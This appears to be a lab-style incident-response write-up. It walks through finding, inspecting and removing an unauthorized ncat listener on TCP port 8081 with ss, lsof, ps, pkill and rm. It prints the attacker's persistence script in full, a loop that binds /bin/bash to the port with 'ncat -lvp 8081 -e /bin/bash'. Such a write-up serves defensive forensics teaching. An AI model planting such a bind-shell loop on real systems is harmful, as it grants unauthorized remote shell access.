# 🌐 Unknown Port Listener

## 📘 Summary

A suspicious process was found listening on TCP port `8081` without prior authorization. This behavior could indicate the presence of a backdoor or unauthorized shell access, potentially left by an attacker.

---

## 🎯 Objectives

- Detect unauthorized services listening on network ports
- Investigate the associated process and binary
- Remove the threat and confirm remediation
- Understand attacker persistence via simple tools

---

## 🛠️ Technical Analysis

### 🔍 Port Discovery

We used `ss` to identify active listening ports on the system:

```bash
sudo ss -tulnp | grep 8081
````

📸 *Screenshot: `screenshots/05-unknow-port-listener/ss_output.png`*

> Note: If the `Process` column was empty, we confirmed the link using `lsof`:

```bash
sudo lsof -i :8081
```

---

### 🧾 Process Inspection

To determine what binary was responsible for the listener:

```bash
ps aux | grep ncat
```

📸 *Screenshot: `screenshots/05-unknow-port-listener/ps_process_details.png`*

We found that `ncat` (from the Nmap suite) was actively listening on port `8081` with a shell bound to it (`-e /bin/bash`), a known persistence technique.

---

### 📂 Binary Origin

The process was being launched by a script placed in `/usr/local/bin/fakeservice`.

Script content:

```bash
#!/bin/bash
while true; do
  ncat -lvp 8081 -e /bin/bash
  sleep 1
done
```

The script continuously restarted `ncat`, creating persistent shell access on port `8081`.

---

## 🧹 Remediation Steps

1. **Stop the process**:

```bash
sudo pkill fakeservice
sudo pkill ncat
```

2. **Delete the malicious script**:

```bash
sudo rm /usr/local/bin/fakeservice
```

📸 *Screenshot: `screenshots/05-unknow-port-listener/binary_removed.png`*

---

## 🔁 Final Verification

We ensured the port was no longer in use:

```bash
sudo ss -tulnp | grep 8081
```

📸 *Screenshot: `screenshots/05-unknow-port-listener/no_output.png`*

✅ No output confirmed the listener was successfully removed and no persistence remained.

---

## ✅ Outcome

The system was cleared of the unauthorized listener. This scenario demonstrates how a simple script combined with `ncat` can provide remote shell access, and why monitoring open ports is critical in internal security operations.

---

## 📚 Lessons Learned

* Unauthorized binaries in `/usr/local/bin` should raise red flags
* `ss`, `lsof`, and `ps` are powerful tools for network forensics
* Even basic tools like `ncat` can be weaponized for persistence
* Final verification is essential — don’t assume cleanup is complete

---

## 📁 Related Screenshots

| Description            | Path                                                       |
| ---------------------- | ---------------------------------------------------------- |
| Port 8081 open         | `screenshots/05-unknow-port-listener/ss_output.png`          |
| Process identification | `screenshots/05-unknow-port-listener/ps_process_details.png` |
| Binary removed         | `screenshots/05-unknow-port-listener/binary_removed.png`     |
| Port no longer visible | `screenshots/05-unknow-port-listener/no_output.png`          |